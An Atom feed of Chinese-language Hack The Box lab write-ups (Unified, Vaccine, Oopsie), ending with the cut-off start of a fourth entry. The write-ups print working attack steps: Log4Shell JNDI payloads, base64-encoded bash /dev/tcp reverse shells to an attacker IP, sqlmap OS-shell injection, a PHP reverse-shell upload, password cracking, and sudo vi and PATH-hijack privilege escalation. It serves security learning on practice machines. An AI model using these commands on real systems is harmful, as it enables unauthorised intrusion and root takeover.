<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title></title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-12-21T06:37:14.699Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>xxshh</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hack-The-Box-Unified</title>
    <link href="http://example.com/2024/12/20/Hack-The-Bdox-Unified/"/>
    <id>http://example.com/2024/12/20/Hack-The-Bdox-Unified/</id>
    <published>2024-12-20T09:47:14.000Z</published>
    <updated>2024-12-21T06:37:14.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>这篇博客探讨了利用 Log4J 漏洞攻击一个非常知名的网络设备监控系统——“UniFi” 的效果。通过利用 Log4J 漏洞，并篡改名为 remember 的 POST 头，来攻击 UniFi，从而获取该机器的反向 shell。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><p>nmap 扫描目标主机端口：</p><p><img src="/../images/Pasted%20image%2020241220185929.png"></p><p>开放了四个端口，但是好像没得到别的有用信息。换个参数再详细扫描一次，发现两条有用信息：</p><p><img src="/../images/Pasted%20image%2020241220191700.png"></p><p><img src="/../images/Pasted%20image%2020241220192200.png"></p><p>nmap 尝试连接 8080 端口并获取页面标题，但它发现该 HTTP 服务进行了重定向。重定向的目标是 <code>https://10.129.180.69:8443/manage</code>，该页面标题是 UniFi Network。访问这个链接：</p><p><img src="/../images/Pasted%20image%2020241220192536.png"></p><p>可以看到 UniFi 登录页面，版本号为 6.4.54。UniFi 是一个知名的网络设备监控系统。那么现在想到的第一件事久是谷歌搜索这个版本有没有被爆出来的漏洞。通过搜索关键词 <code>UniFy 6.4.54 exploit</code>，找到一篇文章：<a href="https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi">另一个着火的 Log4j：Unifi |链轮安全 — Another Log4j on the fire: Unifi | Sprocket Security</a>，利用 <strong>Log4Shell</strong> 漏洞（CVE-2021-44228）实现对 UniFi 的攻击。</p><ul><li><p><strong>Log4J</strong></p><ul><li>Log4J 是一个流行的 Java 日志记录库，它被广泛用于 Java 应用程序中，用于生成日志输出。</li><li>允许开发者在 Java 程序中记录运行时信息、错误、警告等。</li><li>支持多种输出目标（如控制台、文件、数据库等）</li><li>支持不同格式的输出，比如包括时间戳、日志级别、线程名等。</li></ul></li><li><p><strong>Log4Shell</strong></p><ul><li>该漏洞允许攻击者通过恶意构造的日志消息触发远程代码执行（RCE）。</li><li>Log4J 的 <code>lookup</code> 功能支持 JNDI（Java Naming and Directory Interface）查找，它允许日志信息中的特定字符串动态替换。</li><li>攻击者可以在日志消息中插入包含 JNDI 查找请求的恶意代码，如 <code>$&#123;jndi:ldap://attacker.com/malicious&#125;</code>。</li><li>由于 Log4J 不对 JNDI 查找请求做充分的验证，攻击者可以通过上述方式使得 Log4J 向恶意服务器发起请求，加载并执行远程的恶意代码。</li><li>避免该漏洞的最佳方式是升级到 Log4J 2.16.0 或更高版本，以上版本已禁用 JNDI 查找功能。</li></ul></li></ul><p>首先抓个登录包：</p><p><img src="/../images/Pasted%20image%2020241220202547.png"></p><p>前面那篇文章提到 payload 应该放在 remember 参数中：</p><figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/10.10.16.6/whatever</span>&#125;<br><br><span class="hljs-comment"># JNDI:通过调用该 API，应用程序可以定位资源和其他程序对象。资源是提供与系统（如数据库服务器和消息系统）连接的程序对象。</span><br><br><span class="hljs-comment"># LDAP:轻量级目录访问协议,默认运行在 389 端口。</span><br></code></pre></td></tr></table></figure><p>由于 POST 数据是作为 JSON 对象发送的，但 payload 也有方括号 {} ，为了防止将其解析为另一个 JSON 对象，将其放在双引号内，以便将其解析为字符串：</p><p><img src="/../images/Pasted%20image%2020241220210130.png"></p><p>点击发送之后，响应包显示 payload 无效：</p><p><img src="/../images/Pasted%20image%2020241220210101.png"></p><p>尽管如此，payload 实际上正在执行。在端口 389 上启动 tcpdump ，它将监控 LDAP 连接的网络流量：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> tcpdump -i tun0 port <span class="hljs-number">389</span><br></code></pre></td></tr></table></figure><p>tcpdump 输出显示我们的机器上正在接收一个连接。这证明该应用程序确实容易受到攻击：</p><p><img src="/../images/Pasted%20image%2020241220211316.png"></p><p>为了构建可以发送到服务器的 payload，并实现远程代码执行，我们必须在系统上安装 Open-JDK 和 Maven：</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">sudo apt update<br>sudo apt <span class="hljs-keyword">install </span>openjdk<span class="hljs-number">-11</span>-<span class="hljs-keyword">jdk </span>-y<br><span class="hljs-keyword">java </span>-version<br><span class="hljs-comment"># Open-JDK 是 Java 开发工具包，用于构建 Java 应用程序。</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt-get install maven<br>mvn -v<br><span class="hljs-comment"># Maven 是一个集成开发环境 （IDE），用于创建结构化项目并将项目编译成 jar 文件.</span><br></code></pre></td></tr></table></figure><p>安装所需的软件包后，需要下载并构建 Rogue-JNDI ，这是一个用于 JNDI 注入攻击的恶意 LDAP 服务：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/veracode-research/rogue-jndi <br><span class="hljs-built_in">cd</span> rogue-jndi <br>mvn package<br></code></pre></td></tr></table></figure><p>这将在 rogue-jndi&#x2F;target&#x2F; 目录中创建一个 名为 RogueJndi-1-1.jar 的Java 应用程序。<br><img src="/../images/Pasted%20image%2020241221132759.png"></p><p>构造一个实现反弹 shell 的 payload，为防止出现编码问题，对其进行 base64 编码：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> &#x27;bash -c bash -i &gt;&amp;/dev/tcp/<span class="hljs-number">10.10.16.6</span>/<span class="hljs-number">8888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27; | base64<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241221135413.png"></p><p>接下来 启动 Rogue-JNDI 应用程序，并传递 payload：</p><figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">java</span> -<span class="hljs-string">jar</span> <span class="hljs-string">target</span>/<span class="hljs-string">RogueJndi-1</span>.<span class="hljs-string">1</span>.<span class="hljs-string">jar</span> <span class="hljs-built_in">--command</span> <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuNi84ODggMD4mMQo=</span><br><span class="hljs-string">&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> <span class="hljs-built_in">--hostname</span> <span class="hljs-string">&quot;10.10.16.6&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241221135610.png"></p><p>本地开启一个监听端口 8888。回到 BurpSuite 将 payload 改为</p><figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/10.10.16.6:1389/o</span>=tomcat&#125;<br></code></pre></td></tr></table></figure><p>发送之后，rogue 服务器显示以下内容：</p><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">Sending LDAP ResourceRef <span class="hljs-literal">result</span> <span class="hljs-keyword">for</span> o=tomcat <span class="hljs-keyword">with</span> javax.el.ELProcessor payload<br></code></pre></td></tr></table></figure><p>然后监听端口处应该成功获得目标主机的 shell ，但是我反复尝试多次均失败，于是放弃，了解了这个思路就好。</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这个靶场复现失败了，但也是有收获的。以后在渗透过程中，要做好信息收集，目标是否存在已被爆出的漏洞也是重要的一部分。除此之外，也了解了 java 相关的一些知识。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;这篇博客探讨了利用 Log4J 漏洞攻击一个非常知名的网络设</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Vaccine</title>
    <link href="http://example.com/2024/12/20/Hack-The-Box-Vaccine/"/>
    <id>http://example.com/2024/12/20/Hack-The-Box-Vaccine/</id>
    <published>2024-12-20T03:36:34.000Z</published>
    <updated>2024-12-20T09:24:45.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>看完这篇博客，你会了解到 ftp 匿名登录、John the Ripper 爆破密码、sqlmap、升级临时 shell、ssh、GTFOBins等。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><p>nmap 扫描开放端口：</p><p><img src="/../images/Pasted%20image%2020241220115219.png"></p><p>先从 ftp 入手，因为我们看到它允许匿名登录，而且有一个 backup.zip。</p><p>首先连接 ftp 服务器：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ftp</span> <span class="hljs-number">10.129.116.3</span><br><span class="hljs-comment"># 用户名：anonymous 或 ftp</span><br><span class="hljs-comment"># 密码 ：任意字符</span><br></code></pre></td></tr></table></figure><p>下载 backup.zip:</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">get</span> backup.zip<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241220120901.png"></p><p>解压，发现需要密码：</p><p><img src="/../images/Pasted%20image%2020241220121127.png"></p><p>之前介绍过 <strong>John the Ripper</strong> 工具，它可以破解多种加密算法生成的密码哈希，例如 DES、MD5、SHA、bcrypt、Windows LM&#x2F;NTLM 哈希、ZIP 文件密码、PDF 文件密码等。</p><p>对于 ZIP 文件，需要使用 <code>zip2john</code> 工具提取哈希：</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">zip2john <span class="hljs-keyword">backup.zip </span>&gt; hashes<br></code></pre></td></tr></table></figure><p>然后加载字典，对以上哈希值进行暴力破解：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">john <span class="hljs-attribute">-wordlist</span>=Desktop/wordlists/rockyou.txt hashes<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241220123408.png"></p><p>查看 index.php，发现管理员密码：</p><p><img src="/../images/Pasted%20image%2020241220123843.png"></p><p><img src="/../images/Pasted%20image%2020241220124943.png"></p><p>浏览器访问 <a href="http://10.129.116.3/">http://10.129.116.3</a> ，登录管理员账号：</p><p><img src="/../images/Pasted%20image%2020241220125130.png"></p><p>这个功能一定是和数据库连接的:</p><p><img src="/../images/Pasted%20image%2020241220134002.png"></p><p>接下来使用 SQLmap 测试是否存在 SQL 注入。注意这里我们是用管理员身份登录的，所以一定要带上 cookie：</p><p><img src="/../images/Pasted%20image%2020241220135057.png"></p><figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf">sqlmap -u <span class="hljs-string">&quot;http://10.129.116.3/dashboard.php?search=Elixir&quot;</span> --cookie<span class="hljs-operator">=</span><span class="hljs-string">&quot;PHPSESSID=23gd5c0ih2s72tfon818qq9f4s&quot;</span><br></code></pre></td></tr></table></figure><p>结果是 search 参数容易受到 sql 注入的攻击：</p><p><img src="/../images/Pasted%20image%2020241220135713.png"></p><p>接下来使用<code>--os-shell</code>参数执行命令注入：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://10.129.116.3/dashboard.php?search=Elixir&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;PHPSESSID=23gd5c0ih2s72tfon818qq9f4s&quot;</span> <span class="hljs-params">--os-shell</span><br></code></pre></td></tr></table></figure><p>虽然通过 OS-shell 获得了命令行控制，但它只在当前会话有效，并且权限可能会受到限制。为了拥有更强的远程控制能力、绕过防火墙的能力和更持久的连接，我们还是像以前一样执行反弹 shell：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">bash -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.6/888 0&gt;&amp;1&quot;</span><br># bash -<span class="hljs-keyword">c</span> 启动一个新的 Bash 实例隔离环境，确保反向 shell 能顺利启动。<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">888</span><br></code></pre></td></tr></table></figure><p>升级 shell，使其成为一个完全的交互式 shell。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">SHELL</span>=/bin/bash<span class="hljs-built_in"> script </span>-q /dev/<span class="hljs-literal">null</span><br>stty<span class="hljs-built_in"> raw </span>-echo<br>reset<br>xterm<br></code></pre></td></tr></table></figure><p>找到 user flag:<br><img src="/../images/Pasted%20image%2020241220150955.png"></p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>接下来进行权限提升。使用 <code>sudo -l</code> 查看当前用户的 sudo 权限，判断是否有潜在的提权漏洞。但是首先我们要找到当前用户的密码。</p><p>猜测网站目录下应该有明文密码。最终在 &#x2F;var&#x2F;www&#x2F;html&#x2F;dashboard.php 中找到了当前用户的密码：<br><img src="/../images/Pasted%20image%2020241220153202.png"></p><p>shell 总是自动断开，由于目标主机的 22 端口处于开放状态，所以得到密码之后我们可以用 ssh 远程登录：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> postgres@<span class="hljs-number">10.129.116.3</span><br></code></pre></td></tr></table></figure><p>然后 <code>sudo -l</code>：</p><p><img src="/../images/Pasted%20image%2020241220154417.png"></p><p>当处于只有某些二进制文件可用的情况下时，如何获得 root 权限可以参考<a href="%5BGTFOBins%5D(https://gtfobins.github.io/)">GTFOBins</a>。</p><p>当前用户可以使用 <code>vi</code> ，查找相应的文档：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">// <span class="hljs-keyword">If</span> the binary <span class="hljs-keyword">is</span> allowed <span class="hljs-keyword">to</span> run <span class="hljs-keyword">as</span> <span class="hljs-keyword">superuser</span> <span class="hljs-keyword">by</span> `sudo`, it does <span class="hljs-keyword">not</span> <span class="hljs-keyword">drop</span> the elevated <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">and</span> may be used <span class="hljs-keyword">to</span> <span class="hljs-keyword">access</span> the file <span class="hljs-keyword">system</span>, escalate <span class="hljs-keyword">or</span> maintain privileged <span class="hljs-keyword">access</span>.<br><br>sudo vi -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span> /dev/<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><p>在此场景中，<code>sudo</code> 会使得 <code>vi</code> 编辑器以 root 身份运行，而 <code>vi</code> 中的 <code>:!/bin/sh</code> 命令又会启动一个新的 shell。因此，整个过程不会放弃 root 权限，攻击者可以利用这种方式获取到系统的 root 权限。因此我们执行：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">sudo /bin/vi /etc/postgresql/<span class="hljs-number">11</span>/main/pg_hba.conf -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span> /dev/<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241220163003.png"></p><p>因为当前用户的 sudo 权限仅限于 <code>/bin/vi/etc/postgresql/11/main/pg_hba.conf</code> ，所以这种方法不可行。文档中还有一种方法:</p><p><img src="/../images/Pasted%20image%2020241220163300.png"></p><p>于是</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">sudo /bin/vi /etc/postgresql/<span class="hljs-number">11</span>/main/pg_hba.conf<br></code></pre></td></tr></table></figure><p>在 <code>vi</code> 编辑器中按冒号执行以下命令：</p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">set</span> <span class="hljs-keyword">shell</span>=/bin/<span class="hljs-keyword">sh</span><br># 将 `<span class="hljs-keyword">vi</span>` 编辑器的外部 <span class="hljs-keyword">shell</span> 设置为 `/bin/<span class="hljs-keyword">sh</span>`<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241220164222.png"></p><p>按下回车后，输入以下命令：</p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">shell</span><br># 启动一个外部 <span class="hljs-keyword">shell</span>，<span class="hljs-keyword">vi</span> 编辑器会临时退出。<br></code></pre></td></tr></table></figure><p>成功获取 root 权限和 root flag：</p><p><img src="/../images/Pasted%20image%2020241220164820.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这个靶场相对来说简单一些，整个过程中用到的知识，很多都是以前学习过的，但是我并没有完全掌握。应该以后用多了就熟能生巧了吧，希望是这样的哈哈哈。最大的收获是，了解了在只有某些二进制文件可用时的提权手段。继续坚持学吧，虽然不知道能坚持到什么时候。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;看完这篇博客，你会了解到 ftp 匿名登录、John the</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Oopsie</title>
    <link href="http://example.com/2024/12/19/Hack-The-Box-Oopsie/"/>
    <id>http://example.com/2024/12/19/Hack-The-Box-Oopsie/</id>
    <published>2024-12-19T05:29:50.000Z</published>
    <updated>2024-12-20T07:20:22.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>在寻找 WEB 漏洞时，始终要检查cookie、session，并尝试弄清楚访问控制是如何工作的。在许多情况下，远程代码执行和系统的控制权限可能无法单独实现，而是需要将不同类型的漏洞和利用方法结合起来。在本篇博客中，你将学习到，信息泄露和访问控制漏洞这类看似不太重要的漏洞。即使是小漏洞在攻击时也可能会产生巨大影响。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><p>nmap 扫描端口： </p><p><img src="/../images/Pasted%20image%2020241219134020.png"></p><p>访问 <a href="http://10.129.180.28/">http://10.129.180.28</a>:</p><p><img src="/../images/Pasted%20image%2020241219134256.png"></p><p>打开 BurpSuite 的 Target 模块，Site Map功能可以看到目标网站的结构：</p><p><img src="/../images/Pasted%20image%2020241219141112.png"></p><p>发现了一个登录界面：</p><p><img src="/../images/Pasted%20image%2020241219141225.png"></p><p>以访客身份登录：</p><p><img src="/../images/Pasted%20image%2020241219142614.png"></p><p>唯一可操作的就是 uploads 界面，但是需要超级管理员权限：</p><p><img src="/../images/Pasted%20image%2020241219142747.png"></p><p>一种思路就是查看 cookie 或 seesion，是否有操作空间转换为管理员身份：</p><p><img src="/../images/Pasted%20image%2020241219143134.png"></p><p>可以看到，cookie 中有个值就是 Access ID。那么只需获取到 admin 的 Access ID，就可以伪造管理员身份。而 URL 中有个 id 变量，就可以切换账户。凭此漏洞，我们发现，将 id 改为1，显示出了 admin 的 Access ID：</p><p><img src="/../images/Pasted%20image%2020241219143952.png"></p><p>更改cooike，即可访问 uploads 页面：</p><p><img src="/../images/Pasted%20image%2020241219144121.png"></p><p>这里尝试上传后门失败了，查看题解发现可以上传执行反弹 shell 的文件，插件分析出的语言类型是php。</p><p>首先要知道文件上传到哪了。用 gobuster 进行目录爆破：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gobuster</span> dir -u http://<span class="hljs-number">10.129.180.28</span> -w wordlists/dirbuster/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-small.txt<br></code></pre></td></tr></table></figure><p>果然是 uploads 文件夹：</p><p><img src="/../images/Pasted%20image%2020241219151440.png"></p><p>然后上传 PHP 反弹shell。Kali Linux自带此类文件，在 &#x2F;usr&#x2F;share&#x2F;webshells&#x2F; 目录下。也可以从<a href="https://github.com/BlackArch/webshells">BlackArch&#x2F;webshells: Various webshells. We accept pull requests for additions to this collection.</a>下载。</p><p>本机开启一个监听端口：</p><p><img src="/../images/Pasted%20image%2020241219152611.png"></p><p>php-reverse-shell.php 更改主机 ip 和端口：</p><p><img src="/../images/Pasted%20image%2020241219152457.png"></p><p>上传这个文件，然后在浏览器访问我们上传的shell：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">180.28</span><span class="hljs-regexp">/uploads/</span>php-reverse-shell.php<br></code></pre></td></tr></table></figure><p>成功执行反弹 shell。</p><p>输入 <code>whoami</code> 命令，发现当前用户是 www-data：<br><img src="/../images/Pasted%20image%2020241219174655.png"></p><p>在 Linux 系统中，<code>/etc/passwd</code> 是一个非常重要的系统文件，它存储了系统中的所有用户账户信息。每一行代表一个用户的信息，每个字段用冒号分隔：</p><figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">用户名:密码:用户ID:组ID:注释:主目录:</span>登录Shell<br><br># 用户名（Username）：这是用户的登录名，例如 `root` 或 `user1`。<br><br># 密码（Password）：通常是加密的用户密码。但在大多数现代系统中，实际的密码通常存储在 `/etc/shadow` 文件中，而不是 `/etc/passwd`。在旧的系统中，这里可能直接保存加密后的密码（如 `x` 或 `*`）。<br><br># 用户ID（UID）：用户的唯一数字标识符。每个用户都有一个唯一的 UID，`root` 用户通常是 UID <span class="hljs-number">0</span>。<br>    <br># 组ID（GID）：该用户的主组的 GID。每个用户属于一个默认的主组（通常与用户名相同），并且可能属于其他附加组。<br>    <br># 注释（GECOS）：这通常用于存储关于用户的额外信息，如全名、电话号码等。很多系统中，这个字段也可以为空。<br>    <br># 主目录（Home Directory）：用户登录后默认进入的目录。例如，`/home/user1` 是用户 `user1` 的主目录。如果该字段为空，通常表示该用户没有指定的主目录。<br>    <br># 登录Shell（Login Shell）：用户登录后使用的 shell。常见的 shell 如 `/bin/bash`、`/bin/sh` 等。对于不需要登录的用户，可能会设置为 `/sbin/nologin` 或 `/bin/<span class="hljs-literal">false</span>`。<br></code></pre></td></tr></table></figure><p>执行 <code>cat /etc/passwd</code>，发现了两个需要登录的用户：</p><p><img src="/../images/Pasted%20image%2020241219163000.png"></p><p>切换到 &#x2F;home&#x2F;robert，发现 user flag:</p><p><img src="/../images/Pasted%20image%2020241219163253.png"></p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>接下来尝试能否切换为 robert 用户。首先要找到登录密码。网站服务器是 Apache，其文件通常托管在 <code>/var/www/html/</code> 下，在此目录找到了数据库文件 db.php：</p><p><img src="/../images/Pasted%20image%2020241219180418.png"></p><p> <code>su robert</code>切换为 robert 用户，出现错误：</p><p><img src="/../images/Pasted%20image%2020241219181328.png"></p><p>因为我们使用的是一个 php shell，不能算作终端。使用以下命令升级 shell：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">SHELL</span>=/bin/bash<span class="hljs-built_in"> script </span>-q /dev/<span class="hljs-literal">null</span><br>stty<span class="hljs-built_in"> raw </span>-echo<br>reset<br>xterm<br></code></pre></td></tr></table></figure><p>登录成功：</p><p><img src="/../images/Pasted%20image%2020241219182527.png"></p><p>使用 <code>id</code> 命令用于显示当前用户 ID（UID）、组 ID（GID）以及所属的附加组（group）：</p><p><img src="/../images/Pasted%20image%2020241219183005.png"></p><p>观察到用户 robert 属于组 bugtracker 。group（组） 是 Linux 系统中用于管理用户权限的一种机制，可以让一组用户共享相同的访问权限。</p><p>查看属于该组的所有文件：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -group bugtracker <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>只有一个 <code>bugtracker</code> 文件：</p><p><img src="/../images/Pasted%20image%2020241219184553.png"></p><p>执行以下命令查看文件的详细信息及类型：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">ls -la <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/bugtracker &amp;&amp; file /u</span>sr<span class="hljs-regexp">/bin/</span>bugtracker<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241219185502.png"></p><p>这里需要了解有关 SUID（Set owner User ID）的知识。</p><p>在 Unix&#x2F;Linux 系统中，SUID 是一种文件权限设置。当一个<strong>二进制程序（可执行文件）</strong>具有 SUID 权限时，它在执行时将<strong>继承文件所有者的权限</strong>，而不是执行该程序的用户的权限。它的设置通常用来允许普通用户以其他用户的权限（比如 root）来执行某些特定程序，而不需要更高的权限。</p><p>执行这个文件：</p><p><img src="/../images/Pasted%20image%2020241219192826.png"></p><p>发现该工具接受用户输入作为 <code>cat</code> 命令读取的文件的名称。但是这个 <code>cat</code> 不是一个绝对路径，所以我们可以插入我们自己构造的 <code>cat</code> 并将其添加到路径中，这样那个 <code>cat</code> 就会以 root 身份执行。</p><p>要获取 shell，我们需要打开 <code>/bin/sh</code>，由于 <code>bugtracker</code> 文件以 root 身份执行，因此这将创建一个 root shell。但是不能直接写入 <code>/usr/bin</code>，因为 robert 没有权限。可以把它写在 <code>/tmp</code>下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Filename: <span class="hljs-built_in">cat</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Location: /tmp</span><br>/bin/sh<br></code></pre></td></tr></table></figure><p>这里用 vi 和 vim 都没写成功，最后用 echo 成功了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span> &gt; <span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure><p>给 cat 添加执行权限：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure><p>为了执行这个 <code>cat</code>命令，需要将 &#x2F;tmp 目录添加到 PATH 环境变量中：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=/tmp:$PATH<br></code></pre></td></tr></table></figure><p>检查环境变量：</p><p><img src="/../images/Pasted%20image%2020241219204609.png"></p><p>再次运行 bugtracker, 此时以获取了 root 权限。<br><img src="/../images/Pasted%20image%2020241219205012.png"></p><p>找到 root flag:</p><p><img src="/../images/Pasted%20image%2020241219205247.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>本以为这个靶场会做得比较快，大大高估自己了。不过了解到了一些以前从未涉及过的思路，对 Linux 命令和文件系统也更加熟悉了。但是有些知识还是记不住，博客写完了不能就放那不看了，还是得经常回顾。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;在寻找 WEB 漏洞时，始终要检查cookie、sessio</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Archetype</title>
    <link href="http://example.com/2024/12/17/Hack-The-Box-Archetype/"/>
    <id>http://example.com/2024/12/17/Hack-The-Box-Archetype/</id>
    <published>2024-12-17T02:01:40.000Z</published>
    <updated>2024-12-20T07:19:39.136Z</updated>
    
